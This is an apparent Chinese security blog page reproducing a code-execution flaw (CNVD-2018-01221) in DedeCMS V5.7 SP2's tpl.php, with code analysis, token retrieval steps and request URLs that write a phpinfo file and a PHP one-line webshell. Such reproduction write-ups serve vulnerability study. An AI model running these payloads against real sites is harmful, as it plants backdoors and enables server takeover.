@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞一、漏洞简介DedeCMS V5.7SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell 二、漏洞影响三、复现过程需要登录后台 根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件  代码分析(1)此处定义了一个savet">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Dedecms/%EF%BC%88CNVD-2018-01221%EF%BC%89DedeCMS%20V5.7%20SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞一、漏洞简介DedeCMS V5.7SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell 二、漏洞影响三、复现过程需要登录后台 根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件  代码分析(1)此处定义了一个savet">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(CNVD-2018-01221)DedeCMSV5.7SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(CNVD-2018-01221)DedeCMSV5.7SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(CNVD-2018-01221)DedeCMSV5.7SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(CNVD-2018-01221)DedeCMSV5.7SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(CNVD-2018-01221)DedeCMSV5.7SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId30.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(CNVD-2018-01221)DedeCMSV5.7SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId31.png">
+<meta property="article:published_time" content="2022-07-08T06:25:54.435Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.675Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CNVD-2018-01221)DedeCMSV5.7SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Dedecms/（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Dedecms/%EF%BC%88CNVD-2018-01221%EF%BC%89DedeCMS%20V5.7%20SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.435Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CNVD-2018-01221）DedeCMS-V5-7-SP2存在代码执行漏洞"><a href="#（CNVD-2018-01221）DedeCMS-V5-7-SP2存在代码执行漏洞" class="headerlink" title="（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞"></a>（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>DedeCMS V5.7<br>SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>需要登录后台</p>
+<p>根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件</p>
+<p><img src="/resource/(CNVD-2018-01221)DedeCMSV5.7SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><pre><code>(1)此处定义了一个savetagfile的函数，首先做一个判断，参数“action”是否等于savetagfile，如果等于，就进行下一步
+(2)csrf_chack(),这里有一个csrf检验的函数，我们需要加上token来绕过，token是登陆的令牌，当我们向服务器发送登录请求时，在客户端会生成一个用于验证的令牌。
+(3)正则表达式匹配，详情参见https://www.runoob.com/regexp/regexp-rule.html*
+   [a-z0-9_-]&#123;1,&#125;的意思是，匹配所有包含一个以上的字母数字下划线和横杠，后面的\.意思是匹配小数点
+   所以最终那个判断条件的意思是如果参数filename不符合上述的匹配条件，那么就不允许修改操作的进行，所以文件名必须要.lib.php结尾。
+(4)preg_replace的意思是执行一个正则表达式的搜索和替换，我们可以通过例子来分析一下,发现得到的$tagname的值为moonsec
+(5)stripslashes()的作用是引用用一个引用字符串，此处没有多大的作用
+(6)最后是把$content里的内容写入到相对用的路径里，问题就出在了这里，这一部分代码除了对写入的文件名字做了简单的过滤，除了有一个csrf防护之外，其他并没有什么安全措施，     
+   导致我们可以任意写入代码，如果我们直接写入一句话木马，那么就可以直接连上去拿webshell了
+</code></pre>
+<p>根据上面的代码知道要上传的参数有：action,token,filename,content.现在只剩下获取token了，要怎么才能获取到token呢？我们再去tpl.php里看一下，发现action的参数有很多，比如del，upoladok，edit，upload等等，但只有传入upload的时候页面才会回显正常，而其他的都会显示token异常，所以只能通过action=upload来获取token。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>获取token</p>
+<pre><code>http://0-sec.org/dede/tpl.php?action=upload
+</code></pre>
+<p><img src="/resource/(CNVD-2018-01221)DedeCMSV5.7SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<p>然后查看网页源代码，找到token</p>
+<p><img src="/resource/(CNVD-2018-01221)DedeCMSV5.7SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
+<p>构造payload如下</p>
+<pre><code>http://0-sec.org/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token)
+</code></pre>
+<p>访问了成功写入</p>
+<p><img src="/resource/(CNVD-2018-01221)DedeCMSV5.7SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<p>访问写入的文件</p>
+<pre><code>http://0-sec.org/include/taglib/（你上传的文件名）.lib.php
+</code></pre>
+<p><img src="/resource/(CNVD-2018-01221)DedeCMSV5.7SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
+<p>也可以构造一句话木马payload</p>
+<pre><code>http://0-sec.org/dede5.7/dede/tpl.php?filename=caidao.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&amp;token=2d7ef87e9828edaad2d7b6bbe37f1929
+</code></pre>
+<p><img src="/resource/(CNVD-2018-01221)DedeCMSV5.7SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Dedecms/%EF%BC%88CNVD-2018-01221%EF%BC%89DedeCMS%20V5.7%20SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnpl004ky8v1a1hhhn24" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Dedecms/%EF%BC%88CVE-2018-9175%EF%BC%89Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Dedecms/%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88SSV-97087%EF%BC%89DeDecms%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
